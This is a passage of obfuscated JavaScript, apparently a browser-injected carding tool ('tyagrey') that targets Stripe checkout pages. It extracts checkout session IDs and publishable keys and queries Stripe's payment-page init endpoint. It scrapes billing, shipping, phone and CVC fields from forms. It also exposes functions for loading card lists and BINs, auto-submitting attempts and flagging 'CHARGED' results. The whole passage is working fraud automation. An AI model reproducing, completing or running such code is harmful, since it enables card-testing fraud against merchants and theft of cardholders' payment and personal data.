        let _0x5e9db2 = null;
        if (_0x34bd3d.line_item_group?.localized_prices_metas && Array.isArray(_0x34bd3d.line_item_group.localized_prices_metas)) {
          const _0x1f34b9 = _0x34bd3d.line_item_group.localized_prices_metas.find(_0x774d77 => _0x774d77.currency === "usd");
          if (_0x1f34b9 && _0x1f34b9.total && _0x1f34b9.total > 0) {
            _0x57450e = _0x1f34b9.total;
            _0x5e9db2 = "usd";
          }
        }
        if (!_0x57450e && _0x34bd3d.line_item_group?.presentment_exchange_rate_meta?.integration_currency) {
          const _0x4ff061 = _0x34bd3d.line_item_group.presentment_exchange_rate_meta.integration_currency;
          const _0x49a1b4 = parseFloat(_0x34bd3d.line_item_group.presentment_exchange_rate_meta.exchange_rate);
          if (_0x34bd3d.line_item_group.total && _0x49a1b4 > 0) {
            _0x57450e = Math.round(_0x34bd3d.line_item_group.total / _0x49a1b4);
            _0x5e9db2 = _0x4ff061;
          }
        }
        if (!_0x57450e && _0x34bd3d.line_item_group?.total && _0x34bd3d.line_item_group.total > 0) {
          _0x57450e = _0x34bd3d.line_item_group.total;
          _0x5e9db2 = _0x34bd3d.line_item_group.currency || _0x34bd3d.currency;
        }
        if (!_0x57450e && _0x34bd3d.line_item_group?.due && _0x34bd3d.line_item_group.due > 0) {
          _0x57450e = _0x34bd3d.line_item_group.due;
          _0x5e9db2 = _0x34bd3d.line_item_group.currency || _0x34bd3d.currency;
        }
        if (!_0x57450e && _0x34bd3d.line_item_group?.line_items?.[0]) {
          const _0x11dcf7 = _0x34bd3d.line_item_group.line_items[0];
          if (_0x11dcf7.total && _0x11dcf7.total > 0) {
            _0x57450e = _0x11dcf7.total;
            _0x5e9db2 = _0x34bd3d.line_item_group.currency || _0x34bd3d.currency;
          } else if (_0x11dcf7.price?.unit_amount && _0x11dcf7.price.unit_amount > 0) {
            _0x57450e = _0x11dcf7.price.unit_amount * (_0x11dcf7.quantity || 1);
            _0x5e9db2 = _0x11dcf7.price.currency || _0x34bd3d.currency;
          }
        }
        if (!_0x57450e && _0x34bd3d.amount && typeof _0x34bd3d.amount === "number" && _0x34bd3d.amount > 0) {
          _0x57450e = _0x34bd3d.amount;
        }
        if (!_0x57450e && _0x34bd3d.payment_intent?.amount && _0x34bd3d.payment_intent.amount > 0) {
          _0x57450e = _0x34bd3d.payment_intent.amount;
        }
        if (!_0x57450e && _0x34bd3d.invoice?.amount_due && _0x34bd3d.invoice.amount_due > 0) {
          _0x57450e = _0x34bd3d.invoice.amount_due;
        }
        if (!_0x57450e && _0x34bd3d.invoice?.lines?.data?.[0]?.amount && _0x34bd3d.invoice.lines.data[0].amount > 0) {
          _0x57450e = _0x34bd3d.invoice.lines.data[0].amount;
        }
        if (!_0x57450e && _0x34bd3d.amount_received && _0x34bd3d.amount_received > 0) {
          _0x57450e = _0x34bd3d.amount_received;
        }
        if (!_0x57450e && _0x34bd3d.amount_capturable && _0x34bd3d.amount_capturable > 0) {
          _0x57450e = _0x34bd3d.amount_capturable;
        }
        if (!_0x57450e && _0x34bd3d.lines?.data?.[0]?.amount && _0x34bd3d.lines.data[0].amount > 0) {
          _0x57450e = _0x34bd3d.lines.data[0].amount;
        }
        if (!_0x57450e && _0x34bd3d.line_items?.data?.[0]?.amount_total && _0x34bd3d.line_items.data[0].amount_total > 0) {
          _0x57450e = _0x34bd3d.line_items.data[0].amount_total;
        }
        if (!_0x57450e && _0x34bd3d.amount_total && _0x34bd3d.amount_total > 0) {
          _0x57450e = _0x34bd3d.amount_total;
        }
        if (!_0x57450e && _0x34bd3d.amount_due && _0x34bd3d.amount_due > 0) {
          _0x57450e = _0x34bd3d.amount_due;
        }
        if (!_0x57450e && _0x34bd3d.amount_paid && _0x34bd3d.amount_paid > 0) {
          _0x57450e = _0x34bd3d.amount_paid;
        }
        if (!_0x57450e && _0x34bd3d.total && _0x34bd3d.total > 0) {
          _0x57450e = _0x34bd3d.total;
        }
        if (!_0x57450e) {
          const _0x4615b3 = _0x50cff2(_0x34bd3d, "unit_amount_decimal");
          if (_0x4615b3 && parseInt(_0x4615b3) > 0) {
            _0x57450e = parseInt(_0x4615b3);
          }
        }
        if (!_0x57450e) {
          const _0x4b0e7f = _0x50cff2(_0x34bd3d, "unit_amount");
          if (_0x4b0e7f && parseInt(_0x4b0e7f) > 0) {
            _0x57450e = parseInt(_0x4b0e7f);
          }
        }
        if (!_0x57450e) {
          const _0xb8db08 = _0x50cff2(_0x34bd3d, "payment_intent");
          if (_0xb8db08 && typeof _0xb8db08 === "object" && _0xb8db08.amount && _0xb8db08.amount > 0) {
            _0x57450e = _0xb8db08.amount;
          }
        }
        if (_0x57450e !== null && _0x57450e > 0) {
          extractedPaymentData.amount = (Number.parseInt(_0x57450e) / 100).toFixed(2);
          if (_0x5e9db2) {
            extractedPaymentData.currency = _0x5e9db2.toLowerCase();
          }
          _0x43ad32 = true;
        }
      } catch (_0x2b5551) {}
    }
    if (!extractedPaymentData.currency) {
      try {
        let _0x1e537a = null;
        if (_0x34bd3d.line_item_group?.localized_prices_metas && Array.isArray(_0x34bd3d.line_item_group.localized_prices_metas)) {
          const _0x49a903 = _0x34bd3d.line_item_group.localized_prices_metas.find(_0x5a9e8a => _0x5a9e8a.currency === "usd");
          if (_0x49a903) {
            _0x1e537a = "usd";
          }
        }
        if (!_0x1e537a && _0x34bd3d.line_item_group?.presentment_exchange_rate_meta?.integration_currency) {
          _0x1e537a = _0x34bd3d.line_item_group.presentment_exchange_rate_meta.integration_currency;
        }
        if (!_0x1e537a) {
          _0x1e537a = _0x34bd3d.line_item_group?.currency || _0x34bd3d.currency || _0x34bd3d.line_items?.data?.[0]?.currency || _0x50cff2(_0x34bd3d, "currency");
        }
        if (_0x1e537a) {
          extractedPaymentData.currency = _0x1e537a.toLowerCase();
          _0x43ad32 = true;
        }
      } catch (_0x54e288) {}
    }
    if (!extractedPaymentData.businessUrl) {
      try {
        let _0x4d57e7 = null;
        if (_0x34bd3d.business_url) {
          _0x4d57e7 = _0x34bd3d.business_url;
        } else if (_0x34bd3d.account_settings?.business_url) {
          _0x4d57e7 = _0x34bd3d.account_settings.business_url;
        } else if (_0x34bd3d.merchant_business_url) {
          _0x4d57e7 = _0x34bd3d.merchant_business_url;
        } else if (_0x34bd3d.account_settings?.display_name) {
          _0x4d57e7 = _0x34bd3d.account_settings.display_name;
        } else if (_0x34bd3d.account_settings?.order_summary_display_name) {
          _0x4d57e7 = _0x34bd3d.account_settings.order_summary_display_name;
        } else if (_0x34bd3d.statement_descriptor) {
          _0x4d57e7 = _0x34bd3d.statement_descriptor;
        } else {
          const _0x21c731 = _0x50cff2(_0x34bd3d, "display_name");
          if (_0x21c731) {
            _0x4d57e7 = _0x21c731;
          }
        }
        if (!_0x4d57e7) {
          _0x4d57e7 = _0x50cff2(_0x34bd3d, "business_url");
        }
        if (_0x4d57e7) {
          extractedPaymentData.businessUrl = _0x108e98(_0x4d57e7);
          _0x43ad32 = true;
        }
      } catch (_0x3ee2a0) {}
    }
    const _0x10cd95 = Object.values(extractedPaymentData).every(_0x8eb09a => _0x8eb09a !== "");
    if (_0x10cd95) {
      paymentDataFound = true;
      if (extractedPaymentData.businessUrl) {}
    } else if (_0x43ad32) {
      if (!extractedPaymentData.businessUrl) {
        try {
          let _0x581be5 = window.location.hostname;
          _0x581be5 = _0x581be5.replace(/^(checkout|pay|billing|buy)\./, "");
          _0x581be5 = _0x581be5.replace(/^www\./, "");
          extractedPaymentData.businessUrl = _0x581be5;
        } catch (_0x291e0e) {}
      }
      if (!extractedPaymentData.successUrl) {
        try {
          extractedPaymentData.successUrl = window.location.href;
        } catch (_0x5ed129) {}
      }
      if (extractedPaymentData.businessUrl && !binRecommendationShown) {}
    }
  }
  function extractCsLive(_0x33a34e) {
    if (!_0x33a34e || typeof _0x33a34e !== "string") {
      return null;
    }
    const _0x3afd55 = _0x33a34e.match(/\/c\/pay\/(cs_live_[a-zA-Z0-9]+)(?:[#\/]|$)/);
    if (_0x3afd55) {
      return _0x3afd55[1];
    }
    const _0x233fa9 = _0x33a34e.match(/\/payment_pages\/(cs_live_[a-zA-Z0-9]+)/);
    if (_0x233fa9) {
      return _0x233fa9[1];
    }
    const _0xb26c2a = _0x33a34e.match(/checkout\.stripe\.com\/(?:c\/)?pay\/(cs_live_[a-zA-Z0-9]+)/);
    if (_0xb26c2a) {
      return _0xb26c2a[1];
    }
    const _0x3b0b9d = _0x33a34e.match(/cs_live_[a-zA-Z0-9]+(?=[#\/\?&\s]|$)/);
    if (_0x3b0b9d) {
      return _0x3b0b9d[0];
    }
    const _0x1752a9 = _0x33a34e.match(/\/c\/pay\/(cs_test_[a-zA-Z0-9]+)(?:[#\/]|$)/);
    if (_0x1752a9) {
      return _0x1752a9[1];
    }
    const _0x77f7e0 = _0x33a34e.match(/\/payment_pages\/(cs_test_[a-zA-Z0-9]+)/);
    if (_0x77f7e0) {
      return _0x77f7e0[1];
    }
    const _0x3b0858 = _0x33a34e.match(/checkout\.stripe\.com\/(?:c\/)?pay\/(cs_test_[a-zA-Z0-9]+)/);
    if (_0x3b0858) {
      return _0x3b0858[1];
    }
    const _0x2705fb = _0x33a34e.match(/cs_test_[a-zA-Z0-9]+(?=[#\/\?&\s]|$)/);
    if (_0x2705fb) {
      return _0x2705fb[0];
    }
    return null;
  }
  function extractPkLive() {
    const _0x4b9058 = document.documentElement.innerHTML;
    const _0x2024d2 = _0x4b9058.match(/pk_live_[a-zA-Z0-9]+/);
    if (_0x2024d2) {
      return _0x2024d2[0];
    }
    const _0x2c6ab0 = document.querySelectorAll("script");
    for (const _0x58768c of _0x2c6ab0) {
      const _0x1343bc = _0x58768c.textContent || _0x58768c.innerText || "";
      const _0x37169b = _0x1343bc.match(/pk_live_[a-zA-Z0-9]+/);
      if (_0x37169b) {
        return _0x37169b[0];
      }
    }
    try {
      const _0x4b4729 = document.querySelectorAll("[data-stripe-publishable-key]");
      for (const _0x591499 of _0x4b4729) {
        const _0x155b99 = _0x591499.getAttribute("data-stripe-publishable-key");
        if (_0x155b99 && _0x155b99.startsWith("pk_live_")) {
          return _0x155b99;
        }
      }
    } catch (_0x36b658) {}
    const _0xf69f46 = _0x4b9058.match(/pk_test_[a-zA-Z0-9]+/);
    if (_0xf69f46) {
      return _0xf69f46[0];
    }
    for (const _0x2f8c74 of _0x2c6ab0) {
      const _0x4dfaae = _0x2f8c74.textContent || _0x2f8c74.innerText || "";
      const _0x5be55c = _0x4dfaae.match(/pk_test_[a-zA-Z0-9]+/);
      if (_0x5be55c) {
        return _0x5be55c[0];
      }
    }
    try {
      const _0xcc0fcd = document.querySelectorAll("[data-stripe-publishable-key]");
      for (const _0x37582a of _0xcc0fcd) {
        const _0x13c057 = _0x37582a.getAttribute("data-stripe-publishable-key");
        if (_0x13c057 && _0x13c057.startsWith("pk_test_")) {
          return _0x13c057;
        }
      }
    } catch (_0x2dcaa9) {}
    return null;
  }
  async function fetchStripePaymentPageInit(_0x236c61, _0x157fb3) {
    if (!_0x236c61) {
      throw new Error("cs_live identifier is required");
    }
    if (!_0x157fb3) {
      throw new Error("pk_live publishable key is required");
    }
    const _0x153a6c = "https://api.stripe.com/v1/payment_pages/" + _0x236c61 + "/init";
    const _0x364b49 = new URLSearchParams({
      key: _0x157fb3,
      eid: "NA",
      browser_locale: navigator.language || "en-US",
      browser_timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "UTC",
      redirect_type: "url"
    });
    try {
      const _0x386a3e = await fetch(_0x153a6c, {
        method: "POST",
        headers: {
          authority: "api.stripe.com",
          accept: "application/json",
          "accept-language": "en-US,en;q=0.9",
          "cache-control": "no-cache",
          "content-type": "application/x-www-form-urlencoded",
          "user-agent": navigator.userAgent
        },
        body: _0x364b49.toString()
      });
      if (!_0x386a3e.ok) {
        throw new Error("HTTP error! status: " + _0x386a3e.status);
      }
      return await _0x386a3e.json();
    } catch (_0x435554) {
      throw _0x435554;
    }
  }
  function extractAmountFromInitResponse(_0x1a7ae0) {
    if (!_0x1a7ae0 || typeof _0x1a7ae0 !== "object") {
      return {
        amount: null,
        currency: null,
        rawAmount: null,
        email: null,
        businessUrl: null,
        successUrl: null,
        cancelUrl: null,
        merchantName: null,
        productName: null,
        productDescription: null,
        interval: null,
        sessionId: null
      };
    }
    const _0x3fb1e7 = {
      amount: null,
      rawAmount: null,
      currency: null,
      email: null,
      businessUrl: null,
      merchantName: null,
      successUrl: null,
      cancelUrl: null,
      productName: null,
      productDescription: null,
      interval: null,
      sessionId: null,
      mode: null,
      status: null
    };
    function _0x1cf368(_0x541c5a) {
      if (!_0x541c5a) {
        return null;
      }
      let _0x24d634 = _0x541c5a.toString().trim();
      _0x24d634 = _0x24d634.replace(/^https?:\/\//, "");
      _0x24d634 = _0x24d634.replace(/^www\./, "");
      _0x24d634 = _0x24d634.split("/")[0];
      _0x24d634 = _0x24d634.split("?")[0];
      _0x24d634 = _0x24d634.split("#")[0];
      _0x24d634 = _0x24d634.split(":")[0];
      return _0x24d634 || null;
    }
    let _0x8bf75a = null;
    let _0x5427c8 = null;
    if (_0x1a7ae0.line_item_group?.localized_prices_metas && Array.isArray(_0x1a7ae0.line_item_group.localized_prices_metas)) {
      const _0x3b7d68 = _0x1a7ae0.line_item_group.localized_prices_metas.find(_0x58d993 => _0x58d993.currency === "usd");
      if (_0x3b7d68 && _0x3b7d68.total && _0x3b7d68.total > 0) {
        _0x8bf75a = _0x3b7d68.total;
        _0x5427c8 = "usd";
      }
    }
    if (!_0x8bf75a && _0x1a7ae0.line_item_group?.presentment_exchange_rate_meta) {
      const _0x36d958 = _0x1a7ae0.line_item_group.presentment_exchange_rate_meta;
      if (_0x36d958.integration_currency && _0x36d958.exchange_rate && _0x1a7ae0.line_item_group.total) {
        const _0x1b10d0 = parseFloat(_0x36d958.exchange_rate);
        if (_0x1b10d0 > 0) {
          _0x8bf75a = Math.round(_0x1a7ae0.line_item_group.total / _0x1b10d0);
          _0x5427c8 = _0x36d958.integration_currency;
        }
      }
    }
    if (!_0x8bf75a && _0x1a7ae0.line_item_group?.total !== undefined && _0x1a7ae0.line_item_group.total > 0) {
      _0x8bf75a = _0x1a7ae0.line_item_group.total;
      _0x5427c8 = _0x1a7ae0.line_item_group.currency;
    }
    if (!_0x8bf75a && _0x1a7ae0.line_item_group?.due !== undefined && _0x1a7ae0.line_item_group.due > 0) {
      _0x8bf75a = _0x1a7ae0.line_item_group.due;
      _0x5427c8 = _0x1a7ae0.line_item_group.currency;
    }
    if (!_0x8bf75a && _0x1a7ae0.line_item_group?.subtotal !== undefined && _0x1a7ae0.line_item_group.subtotal > 0) {
      _0x8bf75a = _0x1a7ae0.line_item_group.subtotal;
      _0x5427c8 = _0x1a7ae0.line_item_group.currency;
    }
    if (!_0x8bf75a && _0x1a7ae0.line_item_group?.line_items?.[0]) {
      const _0x5c4b7a = _0x1a7ae0.line_item_group.line_items[0];
      if (_0x5c4b7a.total && _0x5c4b7a.total > 0) {
        _0x8bf75a = _0x5c4b7a.total;
        _0x5427c8 = _0x1a7ae0.line_item_group.currency;
      } else if (_0x5c4b7a.price?.unit_amount && _0x5c4b7a.price.unit_amount > 0) {
        _0x8bf75a = _0x5c4b7a.price.unit_amount * (_0x5c4b7a.quantity || 1);
        _0x5427c8 = _0x5c4b7a.price.currency || _0x1a7ae0.line_item_group.currency;
      }
    }
    if (!_0x8bf75a && _0x1a7ae0.invoice?.amount_due !== undefined && _0x1a7ae0.invoice.amount_due > 0) {
      _0x8bf75a = _0x1a7ae0.invoice.amount_due;
      _0x5427c8 = _0x1a7ae0.invoice.currency;
    }
    if (!_0x8bf75a && _0x1a7ae0.invoice?.total !== undefined && _0x1a7ae0.invoice.total > 0) {
      _0x8bf75a = _0x1a7ae0.invoice.total;
      _0x5427c8 = _0x1a7ae0.invoice.currency;
    }
    if (!_0x8bf75a && _0x1a7ae0.invoice?.lines?.data?.[0]?.amount !== undefined) {
      _0x8bf75a = _0x1a7ae0.invoice.lines.data[0].amount;
      _0x5427c8 = _0x1a7ae0.invoice.currency;
    }
    if (!_0x8bf75a && _0x1a7ae0.amount_total !== undefined && _0x1a7ae0.amount_total > 0) {
      _0x8bf75a = _0x1a7ae0.amount_total;
    }
    if (!_0x8bf75a && _0x1a7ae0.amount !== undefined && typeof _0x1a7ae0.amount === "number" && _0x1a7ae0.amount > 0) {
      _0x8bf75a = _0x1a7ae0.amount;
    }
    if (!_0x8bf75a && _0x1a7ae0.payment_intent?.amount !== undefined && _0x1a7ae0.payment_intent.amount > 0) {
      _0x8bf75a = _0x1a7ae0.payment_intent.amount;
      _0x5427c8 = _0x1a7ae0.payment_intent.currency;
    }
    if (!_0x8bf75a && _0x1a7ae0.amount_due !== undefined && _0x1a7ae0.amount_due > 0) {
      _0x8bf75a = _0x1a7ae0.amount_due;
    }
    if (!_0x8bf75a && _0x1a7ae0.amount_paid !== undefined && _0x1a7ae0.amount_paid > 0) {
      _0x8bf75a = _0x1a7ae0.amount_paid;
    }
    if (_0x8bf75a !== null && _0x8bf75a > 0) {
      _0x3fb1e7.rawAmount = _0x8bf75a;
      _0x3fb1e7.amount = (Number(_0x8bf75a) / 100).toFixed(2);
    }
    _0x3fb1e7.currency = _0x5427c8 || _0x1a7ae0.currency || _0x1a7ae0.line_item_group?.currency || _0x1a7ae0.invoice?.currency || "usd";
    _0x3fb1e7.email = _0x1a7ae0.customer_email || _0x1a7ae0.customer?.email || null;
    let _0x40310c = null;
    if (_0x1a7ae0.account_settings?.business_url) {
      _0x40310c = _0x1a7ae0.account_settings.business_url;
    } else if (_0x1a7ae0.account_settings?.display_name) {
      const _0x1cca8c = _0x1a7ae0.account_settings.display_name;
      if (_0x1cca8c.includes(".") && !_0x1cca8c.includes(" ")) {
        _0x40310c = _0x1cca8c;
      }
    }
    if (!_0x40310c && _0x1a7ae0.statement_descriptor) {
      const _0x1eae62 = _0x1a7ae0.statement_descriptor;
      if (_0x1eae62.includes(".")) {
        _0x40310c = _0x1eae62;
      }
    }
    _0x3fb1e7.businessUrl = _0x1cf368(_0x40310c);
    _0x3fb1e7.merchantName = _0x1a7ae0.account_settings?.display_name || _0x1a7ae0.account_settings?.order_summary_display_name || _0x1a7ae0.account_settings?.merchant_of_record_display_name || null;
    _0x3fb1e7.successUrl = _0x1a7ae0.success_url || null;
    _0x3fb1e7.cancelUrl = _0x1a7ae0.cancel_url || null;
    const _0x45049a = _0x1a7ae0.line_item_group?.line_items?.[0] || _0x1a7ae0.invoice?.lines?.data?.[0];
    if (_0x45049a) {
      _0x3fb1e7.productName = _0x45049a.name || _0x45049a.price?.product?.name || null;
      _0x3fb1e7.productDescription = _0x45049a.description || _0x45049a.price?.product?.description || null;
      _0x3fb1e7.interval = _0x45049a.price?.recurring?.interval || null;
    }
    _0x3fb1e7.sessionId = _0x1a7ae0.session_id || null;
    _0x3fb1e7.mode = _0x1a7ae0.mode || null;
    _0x3fb1e7.status = _0x1a7ae0.status || null;
    return _0x3fb1e7;
  }
  function getInputValue(_0x12f8b2) {
    for (const _0x347a12 of _0x12f8b2) {
      try {
        const _0x509a2d = document.querySelector(_0x347a12);
        if (!_0x509a2d) {
          continue;
        }
        if (_0x509a2d.tagName === "SELECT" && _0x509a2d.selectedIndex >= 0) {
          const _0x40fff8 = _0x509a2d.options[_0x509a2d.selectedIndex];
          const _0x57d8cc = _0x40fff8 && _0x40fff8.text ? _0x40fff8.text.trim() : _0x509a2d.value;
          if (_0x57d8cc) {
            return _0x57d8cc;
          }
        }
        if (_0x509a2d.value && _0x509a2d.value.trim()) {
          return _0x509a2d.value.trim();
        }
      } catch (_0x2344f6) {}
    }
    return "";
  }
  function scrapeExtraFormFields() {
    const _0x3da8dd = getInputValue(["#billingName", "[name=\"billingName\"]", "[autocomplete=\"cc-name\"]", "[autocomplete=\"name\"]", "input[placeholder*=\"Name on card\"]", "input[name=\"name\"]", "#name"]);
    const _0x5adeff = getInputValue(["#billingAddressLine1", "[name=\"billingAddressLine1\"]", "[autocomplete=\"address-line1\"]", "#address", "[name=\"address\"]", "input[placeholder*=\"Address\"]", "[name=\"billingAddress\"]", "#billingAddress", "input[id*=\"address\" i]", "input[name*=\"address\" i]", "input[autocomplete*=\"address\" i]"]);
    const _0x599bdc = getInputValue(["#billingLocality", "[name=\"billingLocality\"]", "[autocomplete=\"address-level2\"]", "#city", "[name=\"city\"]", "[name=\"billingCity\"]", "#billingCity", "input[id*=\"city\" i]", "input[name*=\"city\" i]", "input[autocomplete*=\"city\" i]"]);
    const _0x2738ce = getInputValue(["#billingAdministrativeArea", "[name=\"billingAdministrativeArea\"]", "[autocomplete=\"address-level1\"]", "#state", "[name=\"state\"]", "[name=\"billingState\"]", "#billingState", "input[id*=\"state\" i]", "input[name*=\"state\" i]", "input[autocomplete*=\"state\" i]", "select[id*=\"state\" i]", "select[name*=\"state\" i]"]);
    const _0x24d69f = getInputValue(["#billingPostalCode", "[name=\"billingPostalCode\"]", "[autocomplete=\"postal-code\"]", "#zip", "[name=\"zip\"]", "[name=\"postalCode\"]"]);
    const _0x37a593 = getInputValue(["#billingCountry", "[name=\"billingCountry\"]", "[autocomplete=\"country\"]", "#country", "[name=\"country\"]"]);
    const _0x380973 = getInputValue(["#phone", "[name=\"phone\"]", "[autocomplete=\"tel\"]", "input[type=\"tel\"]", "input[placeholder*=\"Phone\"]"]);
    const _0x45bf08 = getInputValue(["#promoCode", "[name=\"promoCode\"]", "[name=\"coupon\"]", "input[placeholder*=\"Promo\"]", "input[placeholder*=\"Coupon\"]"]);
    const _0x56eab6 = getInputValue(["#shippingAddressLine1", "[name=\"shippingAddressLine1\"]", "[autocomplete=\"shipping address-line1\"]", "#shippingAddress", "[name=\"shippingAddress\"]"]);
    const _0x5aadcc = getInputValue(["#shippingLocality", "[name=\"shippingLocality\"]", "[autocomplete=\"shipping address-level2\"]", "#shippingCity", "[name=\"shippingCity\"]"]);
    const _0x52955a = getInputValue(["#shippingAdministrativeArea", "[name=\"shippingAdministrativeArea\"]", "[autocomplete=\"shipping address-level1\"]", "#shippingState", "[name=\"shippingState\"]"]);
    const _0x16eb57 = getInputValue(["#shippingPostalCode", "[name=\"shippingPostalCode\"]", "[autocomplete=\"shipping postal-code\"]", "#shippingZip", "[name=\"shippingZip\"]"]);
    const _0x48526a = getInputValue(["#shippingCountry", "[name=\"shippingCountry\"]", "[autocomplete=\"shipping country\"]"]);
    const _0x5cffaf = getInputValue(["#cvc", "[name=\"cvc\"]", "[autocomplete=\"cc-csc\"]", "input[placeholder*=\"CVC\"]", "input[placeholder*=\"CVV\"]"]);
    return {
      full_name: _0x3da8dd,
      billing_address: _0x5adeff,
      billing_city: _0x599bdc,
      billing_state: _0x2738ce,
      billing_zip: _0x24d69f,
      billing_country: _0x37a593,
      phone: _0x380973,
      promo_code: _0x45bf08,
      shipping_address: _0x56eab6,
      shipping_city: _0x5aadcc,
      shipping_state: _0x52955a,
      shipping_zip: _0x16eb57,
      shipping_country: _0x48526a,
      cvc: _0x5cffaf
    };
  }
  function fallbackExtractFromPage() {
    const _0x2582c3 = {
      amount: null,
      currency: null,
      email: null,
      businessUrl: null,
      successUrl: null,
      method: "fallback_dom"
    };
    try {
      const _0x390552 = document.documentElement.innerHTML;
      const _0x163562 = [/\$(\d+(?:\.\d{2})?)/, /(\d+(?:\.\d{2})?)\s*(?:USD|CAD|EUR|GBP)/i, /"amount":\s*(\d+)/, /"unit_amount":\s*(\d+)/, /"unit_amount_decimal":\s*"(\d+)"/];
      for (const _0x2a917c of _0x163562) {
        const _0x31cb27 = _0x390552.match(_0x2a917c);
        if (_0x31cb27) {
          const _0x30a9db = _0x31cb27[1];
          if (_0x30a9db.length > 2 && !_0x30a9db.includes(".")) {
            _0x2582c3.amount = (Number(_0x30a9db) / 100).toFixed(2);
          } else {
            _0x2582c3.amount = Number(_0x30a9db).toFixed(2);
          }
          break;
        }
      }
      const _0x2589c0 = _0x390552.match(/"customer_email":\s*"([^"]+)"/) || _0x390552.match(/"email":\s*"([^"]+@[^"]+)"/);
      if (_0x2589c0) {
        _0x2582c3.email = _0x2589c0[1];
      }
      const _0x293909 = _0x390552.match(/"business_url":\s*"([^"]+)"/);
      if (_0x293909) {
        _0x2582c3.businessUrl = _0x293909[1];
      }
      const _0xb44851 = _0x390552.match(/"success_url":\s*"([^"]+)"/) || _0x390552.match(/"return_url":\s*"([^"]+)"/);
      if (_0xb44851) {
        _0x2582c3.successUrl = _0xb44851[1];
      }
      const _0xc97cff = _0x390552.match(/"currency":\s*"([a-z]{3})"/i);
      if (_0xc97cff) {
        _0x2582c3.currency = _0xc97cff[1];
      }
    } catch (_0x3320de) {}
    return _0x2582c3;
  }
  async function getStripePaymentAmount(_0x330f37, _0x3f169c = null) {
    if (isInvoiceStripePage()) {
      const _0x304a56 = extractInvoiceData();
      if (_0x304a56) {
        const _0x44fe90 = getInvoiceDisplayName();
        Object.assign(extractedPaymentData, {
          amount: getInvoiceAmount(),
          rawAmount: _0x304a56.amount,
          currency: _0x304a56.currency,
          email: _0x304a56.email,
          businessUrl: _0x304a56.businessUrl || _0x44fe90,
          merchantName: _0x44fe90,
          productName: _0x304a56.productName
        });
        return {
          success: true,
          csLive: null,
          pkLive: null,
          amount: getInvoiceAmount(),
          rawAmount: _0x304a56.amount,
          currency: _0x304a56.currency,
          email: _0x304a56.email,
          businessUrl: _0x304a56.businessUrl || _0x44fe90,
          merchantName: _0x44fe90,
          productName: _0x304a56.productName,
          method: "invoice_extract"
        };
      }
    }
    const _0x4f4c71 = extractCsLive(_0x330f37);
    const _0x4849cc = _0x3f169c || extractPkLive();
    if (_0x4f4c71 && _0x4849cc) {
      try {
        const _0x590752 = await fetchStripePaymentPageInit(_0x4f4c71, _0x4849cc);
        const _0x450937 = extractAmountFromInitResponse(_0x590752);
        _0x450937.method = "init_request";
        Object.assign(extractedPaymentData, {
          amount: _0x450937.amount,
          rawAmount: _0x450937.rawAmount,
          currency: _0x450937.currency,
          email: _0x450937.email,
          businessUrl: _0x450937.businessUrl,
          successUrl: _0x450937.successUrl,
          cancelUrl: _0x450937.cancelUrl,
          merchantName: _0x450937.merchantName,
          productName: _0x450937.productName,
          productDescription: _0x450937.productDescription,
          interval: _0x450937.interval,
          sessionId: _0x450937.sessionId,
          mode: _0x450937.mode,
          status: _0x450937.status
        });
        return {
          success: true,
          csLive: _0x4f4c71,
          pkLive: _0x4849cc,
          ..._0x450937,
          rawResponse: _0x590752
        };
      } catch (_0x40f7c9) {}
    } else {}
    const _0x10d72c = fallbackExtractFromPage();
    if (_0x10d72c.amount || _0x10d72c.email || _0x10d72c.businessUrl) {
      if (_0x10d72c.amount) {
        extractedPaymentData.amount = _0x10d72c.amount;
      }
      if (_0x10d72c.currency) {
        extractedPaymentData.currency = _0x10d72c.currency;
      }
      if (_0x10d72c.email) {
        extractedPaymentData.email = _0x10d72c.email;
      }
      if (_0x10d72c.businessUrl) {
        extractedPaymentData.businessUrl = _0x10d72c.businessUrl;
      }
      if (_0x10d72c.successUrl) {
        extractedPaymentData.successUrl = _0x10d72c.successUrl;
      }
      return {
        success: true,
        csLive: _0x4f4c71,
        pkLive: _0x4849cc,
        ..._0x10d72c
      };
    }
    return {
      success: false,
      error: "Could not extract payment data using any method",
      csLive: _0x4f4c71,
      pkLive: _0x4849cc
    };
  }
  async function autoExtractPaymentFromUrl() {
    const _0x56c305 = window.location.href;
    const _0x3b7ec6 = await getStripePaymentAmount(_0x56c305);
    if (_0x3b7ec6.success) {} else {}
    return _0x3b7ec6;
  }
  window.tyagreyStripeUtils = {
    extractCsLive: extractCsLive,
    extractPkLive: extractPkLive,
    fetchStripePaymentPageInit: fetchStripePaymentPageInit,
    extractAmountFromInitResponse: extractAmountFromInitResponse,
    fallbackExtractFromPage: fallbackExtractFromPage,
    getStripePaymentAmount: getStripePaymentAmount
  };
  window.tyagreyStartAutomation = startAutoSubmit;
  window.tyagreyStopAutomation = stopAutoSubmit;
  window.tyagreyIsRunning = function () {
    return isAutoSubmitting;
  };
  window.tyagreyGetAttemptCount = function () {
    return attemptCount;
  };
  window.tyagreySetMode = function (_0x5939df) {
    currentMode = _0x5939df;
  };
  window.tyagreySetCcList = function (_0x4b4f4c) {
    ccList = _0x4b4f4c.slice(0, 20);
    currentCCIndex = 0;
  };
  window.tyagreySetBins = function (_0x1cdaaf) {
    savedBINs = normalizeBinArray(_0x1cdaaf);
    currentBinIndex = 0;
    localStorage.setItem("tyagrey_saved_bins", JSON.stringify(savedBINs));
    localStorage.setItem("tyagrey_panel_quick_bins", JSON.stringify(savedBINs));
  };
  async function checkResponseForSuccess(_0x101607) {
    return _0x101607;
  }
  async function checkResponseForDeclineCodes(_0x1c86d2) {
    return _0x1c86d2;
  }
  async function handleSuccess() {
    if (attemptCount === 0 || !attemptCount) {
      return;
    }
    if (hasHit || hasNotified) {
      return;
    }
    if (customCheckoutActive) {
      try {
        updateCustomCheckoutStats("live");
      } catch (_0x526839) {}
      try {
        stopCustomCheckoutAutomation();
      } catch (_0x31c824) {}
    }
    let _0xab4869 = "0s";
    if (cardAttemptStartTime) {
      const _0x68a706 = Math.round((Date.now() - cardAttemptStartTime) / 1000);
      const _0x27c8e0 = Math.floor(_0x68a706 / 60);
      const _0x380f9e = _0x68a706 % 60;
      _0xab4869 = _0x27c8e0 > 0 ? _0x27c8e0 + "m " + _0x380f9e + "s" : _0x380f9e + "s";
    }
    if (isAutoSubmitting) {
      try {
        stopAutoSubmit();
      } catch (_0x3b838b) {}
    }
    try {
      if (window.TyagreyOverlay && window.TyagreyOverlay.handleResult) {
        window.TyagreyOverlay.handleResult("CHARGED");
      }
    } catch (_0x5773b0) {}
    try {
